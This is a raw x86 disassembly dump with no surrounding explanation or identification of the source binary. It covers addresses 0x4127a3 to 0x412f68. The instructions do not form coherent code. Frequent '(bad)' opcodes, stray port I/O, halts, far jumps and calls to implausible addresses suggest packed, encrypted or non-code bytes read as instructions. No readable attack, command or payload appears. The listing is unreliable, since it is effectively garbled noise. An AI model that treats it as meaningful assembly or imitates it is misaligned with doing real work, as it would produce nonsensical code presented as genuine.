  4127a3:	or     DWORD PTR [eax-0x69],0x48
  4127a7:	jl     0x4127af
  4127a9:	xchg   ebx,eax
  4127aa:	out    0xd9,al
  4127ac:	inc    eax
  4127ad:	shl    bl,cl
  4127af:	jl     0x4127d7
  4127b1:	arpl   WORD PTR ds:0xc085538c,di
  4127b7:	sahf   
  4127b8:	or     dl,BYTE PTR [ebp+0x70]
  4127bb:	pop    ecx
  4127bc:	retf   0x31ac
  4127bf:	jg     0x41277d
  4127c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127c2:	and    edx,ebx
  4127c4:	xor    bl,BYTE PTR [ebx+0x3acb3d5d]
  4127ca:	dec    ecx
  4127cb:	or     ah,dh
  4127cd:	dec    esi
  4127ce:	mov    ecx,DWORD PTR [ebx-0x2789114c]
  4127d4:	sub    BYTE PTR [esi+0x47e0737],cl
  4127da:	mov    ebp,0xd8551c05
  4127df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e0:	mov    fs,WORD PTR ds:0xf7db9455
  4127e6:	fdiv   DWORD PTR [edx+0x43]
  4127e9:	mov    ecx,0xe2856c83
  4127ee:	push   edx
  4127ef:	pop    eax
  4127f0:	call   0x518ad4f1
  4127f5:	sti    
  4127f6:	add    al,0x7a
  4127f8:	int3   
  4127f9:	fsubr  DWORD PTR [edi+0x1b6acf0f]
  4127ff:	(bad)  
  412800:	and    al,0x3f
  412802:	lods   al,BYTE PTR ds:[esi]
  412803:	cmp    ch,BYTE PTR [esi+0x78c08efe]
  412809:	loope  0x412812
  41280b:	cmp    eax,0x3596882d
  412810:	inc    eax
  412811:	xor    eax,0x27999813
  412816:	jl     0x41284a
  412818:	and    al,0x1d
  41281a:	sbb    eax,esi
  41281c:	bound  eax,QWORD PTR ds:0x557d53be
  412822:	bound  edi,QWORD PTR [esi]
  412824:	jae    0x4127ca
  412826:	scas   al,BYTE PTR es:[edi]
  412827:	push   ebp
  412828:	and    BYTE PTR [eax+0x5e493314],cl
  41282e:	xchg   ecx,eax
  41282f:	lds    ebx,FWORD PTR [ebx+0x3]
  412832:	sub    edx,DWORD PTR ds:[ebp-0x9062b3e]
  412839:	pop    es
  41283a:	mov    ebx,0xffc1d70b
  41283f:	pop    ss
  412840:	ss adc esp,esi
  412843:	xchg   BYTE PTR [eax],ch
  412845:	dec    esi
  412846:	sub    BYTE PTR [esi-0x54593dbe],ch
  41284c:	mov    esi,0xc6ce2bcc
  412851:	sbb    ebx,ebp
  412853:	or     eax,edx
  412855:	or     ecx,DWORD PTR [ecx]
  412857:	cmp    ebp,edx
  412859:	ins    DWORD PTR es:[edi],dx
  41285a:	pushf  
  41285b:	jnp    0x4127f2
  41285d:	ins    DWORD PTR es:[edi],dx
  41285e:	cdq    
  41285f:	aaa    
  412860:	adc    al,0xb6
  412862:	pop    ebx
  412863:	inc    edx
  412864:	ins    DWORD PTR es:[edi],dx
  412865:	adc    eax,0x5456b7ab
  41286a:	push   eax
  41286b:	inc    esp
  41286c:	rol    DWORD PTR [edx+0x18],0x7b
  412870:	and    al,0x50
  412872:	test   al,0x9e
  412874:	jns    0x4128a2
  412876:	imul   ecx,DWORD PTR [bp+si-0x7a],0x2b955274
  41287e:	xchg   esp,eax
  41287f:	push   edi
  412880:	jecxz  0x41288f
  412882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412883:	dec    edi
  412884:	jns    0x412835
  412886:	sub    eax,0xa307a010
  41288b:	or     al,0xf8
  41288d:	repz retf 
  41288f:	nop
  412890:	jecxz  0x4128d8
  412892:	xchg   esi,eax
  412893:	data16 jbe 0x41289a
  412896:	pop    edx
  412897:	(bad)  
  412898:	xor    ecx,eax
  41289a:	outs   dx,BYTE PTR ds:[esi]
  41289b:	cdq    
  41289c:	or     ebx,DWORD PTR [eax+0x48]
  41289f:	hlt    
  4128a0:	pop    edx
  4128a1:	fwait
  4128a2:	mov    edi,0xe291ca41
  4128a7:	inc    ebx
  4128a8:	mov    esp,0xb8ac40a7
  4128ad:	retf   0xb351
  4128b0:	add    BYTE PTR [edi-0x23a121c],dl
  4128b6:	add    DWORD PTR [esi+0xdf8e233],ebp
  4128bc:	mov    cl,0x23
  4128be:	xor    ah,BYTE PTR [eax+0x15931be2]
  4128c4:	and    eax,0x9033c1bb
  4128c9:	ins    DWORD PTR es:[edi],dx
  4128ca:	mov    ebp,0x46798155
  4128cf:	xchg   ecx,eax
  4128d0:	push   ebx
  4128d1:	sub    DWORD PTR [ecx+0x227fa4f7],0x6f21167
  4128db:	mov    ch,0x4f
  4128dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128de:	not    DWORD PTR [eax-0x22782a78]
  4128e4:	mov    BYTE PTR [ebp-0x1a5cc52a],bh
  4128ea:	cdq    
  4128eb:	xor    edi,edi
  4128ed:	sub    edi,ebp
  4128ef:	push   edi
  4128f0:	ja     0x41287b
  4128f2:	xor    ebx,DWORD PTR [edx]
  4128f4:	(bad)  
  4128f5:	ss mov esp,0x24d7fa59
  4128fb:	cdq    
  4128fc:	jp     0x412923
  4128fe:	inc    ebp
  4128ff:	mov    dl,0xe3
  412901:	repnz or ecx,ecx
  412904:	loopne 0x412921
  412906:	(bad)  
  412907:	hlt    
  412908:	lods   eax,DWORD PTR ds:[esi]
  412909:	scas   eax,DWORD PTR es:[edi]
  41290a:	imul   ebx,DWORD PTR [edx+0x58],0xbda22577
  412911:	popa   
  412912:	scas   al,BYTE PTR es:[edi]
  412913:	xchg   ecx,eax
  412914:	cmp    BYTE PTR [edi],dh
  412916:	(bad)  
  412918:	stos   BYTE PTR es:[edi],al
  412919:	stc    
  41291a:	dec    ebp
  41291b:	ret    
  41291c:	mov    cs,edx
  41291e:	icebp  
  41291f:	sub    al,0x76
  412921:	enter  0xdcbf,0x9c
  412925:	outs   dx,DWORD PTR ds:[esi]
  412926:	and    al,0x6d
  412928:	or     cl,al
  41292a:	neg    DWORD PTR [ebp-0xb44dc7f]
  412930:	push   ebp
  412931:	mov    ss,WORD PTR [ebx+edi*1+0x71bb4d73]
  412938:	xchg   esi,eax
  412939:	push   esp
  41293a:	mov    BYTE PTR [eax+eax*8],ch
  41293d:	jns    0x41299e
  41293f:	outs   dx,DWORD PTR ds:[esi]
  412940:	bound  ecx,QWORD PTR [edx]
  412942:	dec    esi
  412943:	mov    cl,dh
  412945:	das    
  412946:	cmp    bl,bl
  412948:	sbb    BYTE PTR ds:[ecx+esi*2+0x24ce804d],cl
  412950:	dec    esi
  412951:	imul   edx,DWORD PTR [ecx-0x7f58ce3a],0xffffffe5
  412958:	popf   
  412959:	loopne 0x4129a6
  41295b:	jns    0x4129d6
  41295d:	mov    eax,ds:0x352de380
  412962:	push   ecx
  412963:	pushf  
  412964:	sub    DWORD PTR [edx],edi
  412966:	pop    esp
  412967:	fiadd  WORD PTR [eax+0x65]
  41296a:	mov    cl,0x7d
  41296c:	dec    ecx
  41296d:	not    BYTE PTR [eax-0x72]
  412970:	xchg   BYTE PTR [eax+0x34],bh
  412973:	daa    
  412974:	out    0x24,al
  412976:	lahf   
  412977:	loop   0x41290a
  412979:	mov    WORD PTR [esi],ds
  41297b:	sub    ah,BYTE PTR [eax]
  41297d:	or     bl,BYTE PTR [esi]
  41297f:	(bad)  
  412980:	in     eax,dx
  412981:	cs push edx
  412983:	shr    DWORD PTR [ebx-0x44],1
  412986:	(bad)  
  412987:	mov    dh,BYTE PTR [ebx]
  412989:	add    ch,BYTE PTR [edi+edi*2-0x4380ec81]
  412990:	push   ss
  412991:	leave  
  412992:	sbb    ch,ah
  412994:	test   BYTE PTR [edi*2-0x43517884],cl
  41299b:	out    dx,al
  41299c:	mov    bl,0x79
  41299e:	shl    BYTE PTR [ecx-0x50],1
  4129a1:	sbb    bl,BYTE PTR ds:0x2d33bc63
  4129a7:	pop    ecx
  4129a8:	cli    
  4129a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129aa:	push   ebp
  4129ab:	cdq    
  4129ac:	mov    esp,0xb491d3aa
  4129b1:	push   edx
  4129b2:	push   ss
  4129b3:	and    ah,BYTE PTR [edx]
  4129b5:	adc    eax,DWORD PTR [ecx-0x45]
  4129b8:	es push esi
  4129ba:	add    ebx,DWORD PTR [edx-0x14]
  4129bd:	push   esp
  4129be:	adc    eax,DWORD PTR [eax-0x5b2e5bf3]
  4129c4:	cld    
  4129c5:	mov    fs,WORD PTR [esp+esi*1+0x3fe4adf9]
  4129cc:	in     eax,0x49
  4129ce:	add    BYTE PTR [edx+0x99d64b7],0x20
  4129d5:	push   0x68bda662
  4129da:	mov    DWORD PTR [ebx+0x3639fb72],eax
  4129e0:	scas   al,BYTE PTR es:[edi]
  4129e1:	jae    0x4129d9
  4129e3:	push   cs
  4129e4:	push   ebx
  4129e5:	push   esp
  4129e6:	sub    al,0x26
  4129e8:	lds    eax,FWORD PTR [eax+0x691b742c]
  4129ee:	jmp    0xd8d79ae2
  4129f3:	(bad)  
  4129f4:	push   edi
  4129f5:	(bad)  
  4129f6:	outs   dx,BYTE PTR ds:[esi]
  4129f7:	jno    0x4129ea
  4129f9:	icebp  
  4129fa:	popf   
  4129fb:	aam    0x54
  4129fd:	sub    DWORD PTR [esi-0x2],ebp
  412a00:	and    esp,DWORD PTR [ebx+0x13efd979]
  412a06:	sbb    ebx,DWORD PTR [ebx+ebx*1+0x188187aa]
  412a0d:	in     al,0x48
  412a0f:	adc    BYTE PTR [edi-0x45bdc500],0xac
  412a16:	dec    edx
  412a17:	pop    edx
  412a18:	pop    ecx
  412a19:	cmc    
  412a1a:	pusha  
  412a1b:	test   al,0x55
  412a1d:	and    DWORD PTR [edx+0x10],ebx
  412a20:	pop    esi
  412a21:	or     edx,0x77d14ca4
  412a27:	cmp    al,0x8e
  412a29:	and    BYTE PTR [ebx-0x39],dl
  412a2c:	loopne 0x4129ce
  412a2e:	scas   eax,DWORD PTR es:[edi]
  412a2f:	cdq    
  412a30:	call   0x696cb831
  412a35:	cmp    BYTE PTR [edx],0xc3
  412a38:	hlt    
  412a39:	lds    edx,FWORD PTR [edi+0x2e62e37b]
  412a3f:	(bad)  
  412a40:	cwde   
  412a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a42:	clc    
  412a43:	pop    eax
  412a44:	bound  ebp,QWORD PTR [edx+0x2]
  412a47:	push   es
  412a48:	jp     0x412a7b
  412a4a:	div    DWORD PTR [ecx-0x1d]
  412a4d:	lods   al,BYTE PTR ds:[esi]
  412a4e:	cmp    DWORD PTR [edi+0x4c],edx
  412a51:	mov    WORD PTR [eax+0xb],?
  412a54:	pop    ecx
  412a55:	call   0xbd7a2888
  412a5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a5b:	mov    bl,BYTE PTR [eax]
  412a5d:	std    
  412a5e:	and    cl,dl
  412a60:	mov    ds:0x3e09ba62,eax
  412a65:	mov    esp,0x49b510ac
  412a6a:	nop
  412a6b:	es fdivp st(5),st
  412a6e:	in     eax,0xba
  412a70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a71:	arpl   WORD PTR [ebp+0x2],cx
  412a74:	cmp    eax,DWORD PTR [ebx]
  412a76:	(bad)  
  412a77:	and    edi,DWORD PTR [edx]
  412a79:	icebp  
  412a7a:	dec    ecx
  412a7b:	aad    0xb2
  412a7d:	jbe    0x412ad2
  412a7f:	xor    ecx,ebx
  412a81:	rcl    DWORD PTR [ebp+0x503a3770],cl
  412a87:	push   esp
  412a88:	add    al,0x85
  412a8a:	shr    eax,1
  412a8c:	and    BYTE PTR [ebx],bh
  412a8e:	es pop ds
  412a90:	or     BYTE PTR [edx],dh
  412a92:	adc    al,ch
  412a94:	shr    ebp,1
  412a96:	scas   al,BYTE PTR es:[edi]
  412a97:	idiv   DWORD PTR [edx+0x1d662579]
  412a9d:	mov    dl,0x6e
  412a9f:	xchg   ah,dh
  412aa1:	push   eax
  412aa2:	or     al,0xa3
  412aa4:	push   es
  412aa5:	stos   BYTE PTR es:[edi],al
  412aa6:	sbb    eax,0x1f0258a1
  412aac:	add    ecx,DWORD PTR [esi+0x9]
  412aaf:	popf   
  412ab0:	add    eax,0x2ecf1e82
  412ab5:	jns    0x412aaa
  412ab7:	clc    
  412ab8:	popf   
  412ab9:	addr16 jo 0x412b0b
  412abc:	inc    ecx
  412abd:	scas   al,BYTE PTR es:[edi]
  412abe:	cs jl  0x412a76
  412ac1:	rcl    BYTE PTR [ebp+0x388e5b1],1
  412ac7:	mov    edx,0x4d501814
  412acc:	inc    ebp
  412acd:	mov    ebx,0x11a53ea8
  412ad2:	sbb    BYTE PTR [edx+0x12b13ac3],bh
  412ad8:	add    al,0xfe
  412ada:	add    BYTE PTR [edx-0x645aa665],cl
  412ae0:	leave  
  412ae1:	ror    al,cl
  412ae3:	cmp    cl,BYTE PTR [esi-0x69c859bd]
  412ae9:	out    0x4d,al
  412aeb:	sbb    ebp,DWORD PTR [ebx-0xa]
  412aee:	ret    
  412aef:	jae    0x412ac5
  412af1:	sub    eax,0xf70dda9a
  412af6:	cwde   
  412af7:	test   eax,0x58270bbd
  412afc:	or     esi,0xc878a7a7
  412b02:	ins    BYTE PTR es:[edi],dx
  412b03:	mov    DWORD PTR [ebx+0x5a],ebp
  412b06:	add    ch,BYTE PTR [edx-0x47bf07f3]
  412b0c:	push   ds
  412b0d:	(bad)
  412b11:	scas   eax,DWORD PTR es:[edi]
  412b12:	and    al,cl
  412b14:	(bad)  
  412b15:	sbb    dl,BYTE PTR [edx]
  412b17:	inc    ecx
  412b18:	pop    eax
  412b19:	mov    ds:0x25b74dc6,eax
  412b1e:	inc    ecx
  412b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b20:	and    eax,0x684f351
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	cs pushf 
  412b28:	call   0x2d98a987
  412b2d:	pop    ebp
  412b2e:	sub    al,0xf6
  412b30:	hlt    
  412b31:	dec    edx
  412b32:	sbb    edi,ecx
  412b34:	xor    DWORD PTR [ecx],eax
  412b36:	pop    esi
  412b37:	cmc    
  412b38:	mov    dh,0x7f
  412b3a:	xchg   esp,eax
  412b3b:	push   esi
  412b3c:	cdq    
  412b3d:	add    edx,DWORD PTR ds:0x7fde99bd
  412b43:	pop    es
  412b44:	inc    eax
  412b45:	aad    0x27
  412b47:	in     eax,0xce
  412b49:	enter  0xff42,0xca
  412b4d:	inc    eax
  412b4e:	xor    BYTE PTR [edx],al
  412b50:	mov    ds:0xfd73d055,al
  412b55:	xor    edi,esp
  412b57:	js     0x412b6a
  412b59:	mov    bl,0x8d
  412b5b:	xor    edi,eax
  412b5d:	ja     0x412ae4
  412b5f:	xor    ah,BYTE PTR ds:0x1ba6fa28
  412b65:	nop
  412b66:	sbb    eax,DWORD PTR [esp+esi*8+0x6176952a]
  412b6d:	inc    edx
  412b6e:	dec    esp
  412b6f:	out    0xe8,al
  412b71:	fs mov cl,0xac
  412b74:	or     eax,DWORD PTR [edx+edx*2-0x57d299e1]
  412b7b:	jl     0x412b42
  412b7d:	shr    DWORD PTR [edx],1
  412b7f:	jmp    0x412be9
  412b81:	lahf   
  412b82:	xor    eax,esp
  412b84:	mov    al,0x39
  412b86:	cmp    al,0xb5
  412b88:	outs   dx,BYTE PTR ds:[esi]
  412b89:	pop    ss
  412b8a:	dec    edi
  412b8b:	in     eax,dx
  412b8c:	adc    DWORD PTR [ebx+0x3d],eax
  412b8f:	mov    dl,BYTE PTR [edx+0x6e5c453d]
  412b95:	(bad)  
  412b96:	jmp    0x6eee:0x6a42fc27
  412b9d:	jge    0x412b2a
  412b9f:	(bad)  
  412ba0:	in     eax,0x3
  412ba2:	lock adc DWORD PTR [edx],ebp
  412ba5:	(bad)  
  412ba6:	jbe    0x412c00
  412ba8:	xor    edi,DWORD PTR [edi+0x1cbf5001]
  412bae:	push   0xcdb20cd3
  412bb3:	ret    0xa58c
  412bb6:	mov    bh,BYTE PTR ds:0x1905351
  412bbc:	inc    edi
  412bbd:	xor    BYTE PTR fs:[edi],bl
  412bc0:	mov    bl,0xc8
  412bc2:	retf   0x44b
  412bc5:	dec    ebx
  412bc6:	call   0x80e28019
  412bcb:	and    eax,eax
  412bcd:	lea    edx,[edi-0x65]
  412bd0:	push   esp
  412bd1:	imul   BYTE PTR [eax+0x7bdbd3eb]
  412bd7:	jbe    0x412b59
  412bd9:	xor    ebx,ebx
  412bdb:	loop   0x412baa
  412bdd:	ins    DWORD PTR es:[edi],dx
  412bde:	sub    DWORD PTR ds:0x431cd850,0x4c
  412be5:	out    dx,al
  412be6:	or     DWORD PTR [eax-0x2a],ecx
  412be9:	inc    ebp
  412bea:	push   0xffffffea
  412bec:	ret    
  412bed:	rcl    BYTE PTR [edi],0x2e
  412bf0:	mov    ss,WORD PTR [ecx-0x2e3e5429]
  412bf6:	loopne 0x412b87
  412bf8:	xchg   ebp,eax
  412bf9:	call   ebx
  412bfb:	cmp    eax,0xe2b198cd
  412c00:	fcompp 
  412c02:	in     al,dx
  412c03:	(bad)  
  412c04:	xchg   esi,eax
  412c05:	jno    0x412bad
  412c07:	int3   
  412c08:	sub    esi,0x336bdbc0
  412c0e:	mov    edi,0x27d8287
  412c13:	pop    es
  412c14:	aas    
  412c15:	sbb    dh,ch
  412c17:	cmp    bh,BYTE PTR [ebp-0x4f]
  412c1a:	in     al,dx
  412c1b:	inc    edi
  412c1c:	rol    BYTE PTR [ecx+0x38],1
  412c1f:	dec    esi
  412c20:	jmp    0x340b:0x2f131f40
  412c27:	jecxz  0x412c9c
  412c29:	mov    ch,0x4d
  412c2b:	or     bl,BYTE PTR [edx-0x2a3472f7]
  412c31:	aas    
  412c32:	pop    esi
  412c33:	or     BYTE PTR ds:0x7d130e84,ah
  412c39:	pop    eax
  412c3a:	in     eax,dx
  412c3b:	inc    ebx
  412c3c:	scas   eax,DWORD PTR es:[edi]
  412c3d:	nop
  412c3e:	jno    0x412c34
  412c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c41:	jne    0x412cb3
  412c43:	int3   
  412c44:	xor    eax,0x35367aa5
  412c49:	pushf  
  412c4a:	dec    esi
  412c4b:	and    edi,DWORD PTR [edi-0x7a]
  412c4e:	mov    bh,0x83
  412c50:	nop
  412c51:	mov    al,0xb7
  412c53:	int3   
  412c54:	xor    al,0x31
  412c56:	adc    DWORD PTR [ebx+0x2b],0x50
  412c5a:	lahf   
  412c5b:	imul   BYTE PTR [ebp-0x14]
  412c5e:	lea    eax,[eax]
  412c60:	adc    al,0x86
  412c62:	cld    
  412c63:	add    al,0xed
  412c65:	lahf   
  412c66:	fld    QWORD PTR [eax+0x4f6a0d96]
  412c6c:	(bad)  
  412c6d:	aaa    
  412c6e:	int    0xc5
  412c70:	fadd   QWORD PTR [eax]
  412c72:	pop    esi
  412c73:	pop    ebp
  412c74:	mov    ecx,0x232e9c67
  412c79:	add    DWORD PTR [edx+0x78],0x1d
  412c7d:	gs loope 0x412cc7
  412c80:	sbb    DWORD PTR [ecx*1+0x621f1806],0xb1b1b575
  412c8b:	mov    ds:0x4f4b7f3a,eax
  412c90:	ror    al,cl
  412c92:	jae    0x412d0d
  412c94:	hlt    
  412c95:	stos   BYTE PTR es:[edi],al
  412c96:	push   ecx
  412c97:	jmp    0x412d0f
  412c99:	add    ebp,DWORD PTR [ebp-0x77]
  412c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9d:	(bad)
  412ca0:	int    0xff
  412ca2:	fnstcw WORD PTR cs:[esi]
  412ca5:	test   eax,0xc2192533
  412caa:	push   ebp
  412cab:	fcmovnu st,st(3)
  412cad:	out    0x47,eax
  412caf:	cmp    ecx,DWORD PTR [edi-0x3b]
  412cb2:	jo     0x412c78
  412cb4:	not    DWORD PTR ds:0xd2272107
  412cba:	daa    
  412cbb:	xchg   edx,eax
  412cbc:	lds    edi,FWORD PTR [edi-0x247aafdd]
  412cc2:	or     ebp,edi
  412cc4:	aas    
  412cc5:	mov    edi,0x5b8df7f9
  412cca:	xor    ebp,esi
  412ccc:	aam    0xd7
  412cce:	imul   ebx,DWORD PTR [ecx-0x5c],0x6ff92000
  412cd5:	xchg   bh,al
  412cd7:	jle    0x412d28
  412cd9:	fiadd  DWORD PTR [ecx+0x3f]
  412cdc:	sbb    edx,DWORD PTR ds:0x77c061fc
  412ce2:	pop    edi
  412ce3:	jno    0x412c8d
  412ce5:	out    0x2f,al
  412ce7:	xor    DWORD PTR [eax+0x7407b6ad],ecx
  412ced:	loope  0x412cd6
  412cef:	fwait
  412cf0:	add    eax,0x79203aa8
  412cf5:	call   0xd4e3206
  412cfa:	ficomp WORD PTR cs:[edi+0x62]
  412cfe:	jmp    0x3d0a:0xbafaeed3
  412d05:	(bad)  
  412d06:	mov    dh,0xb0
  412d08:	pushf  
  412d09:	leave  
  412d0a:	iret   
  412d0b:	dec    eax
  412d0c:	mov    ebx,0xd2b0ceec
  412d11:	out    0x6e,al
  412d13:	ror    esi,0x2a
  412d16:	(bad)  
  412d17:	xor    dl,BYTE PTR [ebx+0x7a]
  412d1a:	aas    
  412d1b:	xchg   edi,eax
  412d1c:	mov    eax,0x17704dc3
  412d21:	adc    bh,0xfa
  412d24:	das    
  412d25:	jge    0x412d92
  412d27:	inc    ebx
  412d28:	popf   
  412d29:	cli    
  412d2a:	sahf   
  412d2b:	push   esp
  412d2c:	aas    
  412d2d:	js     0x412daa
  412d2f:	sub    eax,eax
  412d31:	cmp    dh,ah
  412d33:	push   esp
  412d34:	jl     0x412cce
  412d36:	les    edx,FWORD PTR [esi]
  412d38:	mov    ds:0xf2cfad07,al
  412d3d:	loopne 0x412d0c
  412d3f:	mov    al,ds:0xf86627b2
  412d44:	rcr    DWORD PTR [ecx+0x53],cl
  412d47:	push   edx
  412d48:	or     DWORD PTR [ebp+0x6a],esp
  412d4b:	adc    eax,0x5a756be2
  412d50:	cli    
  412d51:	xor    bh,bh
  412d53:	xchg   esi,eax
  412d54:	xchg   esi,eax
  412d55:	mov    ecx,0x5a076e3
  412d5a:	cld    
  412d5b:	(bad)  
  412d5c:	hlt    
  412d5d:	in     al,dx
  412d5e:	pop    esi
  412d5f:	jecxz  0x412d9f
  412d61:	aas    
  412d62:	add    al,0xb2
  412d64:	inc    ecx
  412d65:	hlt    
  412d66:	mov    BYTE PTR [edi-0x71],ah
  412d69:	inc    eax
  412d6a:	cmp    eax,0xf2e3f0c6
  412d6f:	push   esp
  412d70:	jmp    0xbce9f8f1
  412d75:	mov    al,ds:0x83db1a33
  412d7a:	outs   dx,BYTE PTR ds:[esi]
  412d7b:	dec    edi
  412d7c:	imul   edi,DWORD PTR [esi-0x14ec8461],0xffffffa1
  412d83:	cmp    BYTE PTR [eax+0x16],bl
  412d86:	shl    DWORD PTR [eax+0x4d],0x6
  412d8a:	fsub   st(6),st
  412d8c:	or     eax,0xb2ae222f
  412d91:	loopne 0x412d34
  412d93:	push   ss
  412d94:	sub    BYTE PTR [esi],ch
  412d96:	cmp    eax,ebp
  412d98:	push   esp
  412d99:	shl    DWORD PTR [ebx],cl
  412d9b:	jg     0x412dd1
  412d9d:	out    0x4f,eax
  412d9f:	out    dx,eax
  412da0:	push   0x941dd7ac
  412da5:	sahf   
  412da6:	push   ecx
  412da7:	imul   ecx,edx,0x4ebc4245
  412dad:	cmp    eax,0x7323928f
  412db2:	inc    edi
  412db3:	or     esp,DWORD PTR [ecx+0x18]
  412db6:	mov    dh,0x5
  412db8:	pop    ss
  412db9:	idiv   BYTE PTR [ebx]
  412dbb:	lahf   
  412dbc:	mov    edi,0xae16bdbd
  412dc1:	cmp    al,0x37
  412dc3:	push   ds
  412dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc5:	pop    ebx
  412dc6:	les    esi,FWORD PTR [ebx]
  412dc8:	dec    ecx
  412dc9:	jmp    0x27d8:0xecb24545
  412dd0:	outs   dx,BYTE PTR ds:[esi]
  412dd1:	rol    esi,1
  412dd3:	nop
  412dd4:	jecxz  0x412df2
  412dd6:	xchg   ebx,eax
  412dd7:	retf   0xfd72
  412dda:	test   al,0x36
  412ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ddd:	mov    edi,0xd0c8408b
  412de2:	adc    eax,DWORD PTR [edx]
  412de4:	int    0x53
  412de6:	rcr    BYTE PTR [edx],0xd8
  412de9:	inc    edi
  412dea:	imul   edi,DWORD PTR [ecx+0x7b],0x22bce390
  412df1:	or     BYTE PTR [edi-0x79a639f2],dh
  412df7:	push   ds
  412df8:	or     DWORD PTR [edx+0x1b],esp
  412dfb:	stos   BYTE PTR es:[edi],al
  412dfc:	call   0xf36b:0x6303ed81
  412e03:	stc    
  412e04:	dec    ebp
  412e05:	mov    ch,0x1
  412e07:	sub    esi,ebp
  412e09:	jns    0x412dcd
  412e0b:	pop    ss
  412e0c:	sbb    al,0xb2
  412e0e:	jae    0x412e3f
  412e10:	and    DWORD PTR [ebx+0x11],esi
  412e13:	sub    BYTE PTR [ebp-0x11],0x89
  412e17:	sbb    DWORD PTR [ebx*2+0x31314cce],esp
  412e1e:	adc    eax,0x71f3b384
  412e23:	stos   BYTE PTR es:[edi],al
  412e24:	dec    esp
  412e25:	jnp    0x412e60
  412e27:	ret    0xbce6
  412e2a:	int3   
  412e2b:	or     ah,BYTE PTR [edi+0x65b0d29b]
  412e31:	dec    ecx
  412e32:	sbb    al,0x7d
  412e34:	cmp    DWORD PTR [eax],eax
  412e36:	int3   
  412e37:	mov    ebp,DWORD PTR [esi-0x53]
  412e3a:	test   DWORD PTR [ebx-0x34],ebx
  412e3d:	fisub  WORD PTR [ebp+0x64370199]
  412e43:	sbb    edx,DWORD PTR [ebx+0x6b]
  412e46:	mov    esp,ebx
  412e48:	push   esi
  412e49:	mov    ebx,0xe5c96739
  412e4e:	pop    ebx
  412e4f:	pop    eax
  412e50:	xchg   esi,eax
  412e51:	cs loop 0x412ebf
  412e54:	cmp    eax,0xbf7ab6c
  412e59:	pop    esi
  412e5a:	sar    BYTE PTR [esi-0x2c],0xa9
  412e5e:	sahf   
  412e5f:	call   0x1962:0xb4ea887a
  412e66:	fadd   st(1),st
  412e68:	fxtract 
  412e6a:	pop    esi
  412e6c:	jle    0x412eaf
  412e6e:	or     DWORD PTR [eax-0x55f5bb8e],edx
  412e74:	mov    esi,0x8d992517
  412e79:	cwde   
  412e7a:	les    edi,FWORD PTR [ebx+0x426ff423]
  412e80:	cmp    ch,dh
  412e82:	cmp    ebp,DWORD PTR [ecx]
  412e84:	sbb    bl,BYTE PTR [edi+0x1e5dce98]
  412e8a:	inc    ebx
  412e8b:	jno    0x412eff
  412e8d:	dec    edx
  412e8e:	(bad)  
  412e8f:	fcmovnu st,st(2)
  412e91:	stc    
  412e92:	rcr    BYTE PTR [edx-0x6dfe317f],1
  412e98:	or     esi,DWORD PTR [esi+0x62]
  412e9b:	jno    0x412e49
  412e9d:	sahf   
  412e9e:	and    al,0xc0
  412ea0:	mov    al,ds:0xbe8cb2c5
  412ea5:	out    dx,al
  412ea6:	loope  0x412e41
  412ea8:	test   DWORD PTR [edi],eax
  412eaa:	inc    esi
  412eab:	gs jmp 0x1148190f
  412eb1:	xor    DWORD PTR [ebp-0x436705f],0x18
  412eb8:	ret    
  412eb9:	call   0xe33d:0xec7115bc
  412ec0:	jne    0x412f1b
  412ec2:	jmp    0xb0c8:0xba00ab25
  412ec9:	adc    cl,BYTE PTR [esi+ebp*2-0x70]
  412ecd:	sbb    eax,DWORD PTR ds:0xa047125e
  412ed3:	dec    eax
  412ed4:	sbb    DWORD PTR [ecx+ecx*2+0xc9b3477],ecx
  412edb:	iret   
  412edc:	mov    gs,WORD PTR [ebx+0x51]
  412edf:	neg    cl
  412ee1:	clc    
  412ee2:	pop    eax
  412ee3:	mov    ecx,0x4cb3cac5
  412ee8:	ficomp DWORD PTR [esi]
  412eea:	jmp    0x412f39
  412eec:	ret    0x6974
  412eef:	hlt    
  412ef0:	test   al,0x2d
  412ef2:	(bad)  
  412ef4:	loope  0x412eb7
  412ef6:	mov    edi,0x5a41bef9
  412efb:	xchg   esi,eax
  412efc:	xchg   ebp,eax
  412efd:	fisttp WORD PTR [esi-0x10]
  412f00:	jmp    0x876c:0xb6e23298
  412f07:	jno    0x412f03
  412f09:	fwait
  412f0a:	mov    ds:0x99e34fb3,al
  412f0f:	stc    
  412f10:	loop   0x412f4b
  412f12:	iret   
  412f13:	out    dx,eax
  412f14:	enter  0x4815,0x16
  412f18:	sbb    ch,ch
  412f1a:	icebp  
  412f1b:	data16 rcr BYTE PTR [edx],0x67
  412f1f:	xchg   DWORD PTR [ecx],esp
  412f21:	sbb    eax,DWORD PTR [ebp+0x2342cb4c]
  412f27:	xchg   DWORD PTR [edi-0x1e04a96e],ecx
  412f2d:	push   esp
  412f2e:	arpl   WORD PTR [eax-0x73],si
  412f31:	mov    dh,0x67
  412f33:	lods   eax,DWORD PTR ds:[esi]
  412f34:	ss mov bh,0x96
  412f37:	imul   edi,DWORD PTR es:[edx+0x1230ccb9],0xffffffbb
  412f3f:	jns    0x412f94
  412f41:	cmp    DWORD PTR [eax-0x25693eef],ecx
  412f47:	sbb    BYTE PTR [ebx],0x97
  412f4a:	bound  ebx,QWORD PTR [ebx-0x53252d92]
  412f50:	xchg   edi,eax
  412f51:	imul   esi,DWORD PTR [ecx-0xad69046]
  412f58:	pusha  
  412f59:	ds inc ebx
  412f5b:	sub    ah,al
  412f5d:	int3   
  412f5e:	mov    DWORD PTR [ebx-0x78],ecx
  412f61:	and    cl,dh
  412f63:	mov    al,ds:0x9dd75825
  412f68:	adc    DWORD PTR [eax+ecx*8+0x77ebc1e7],edi
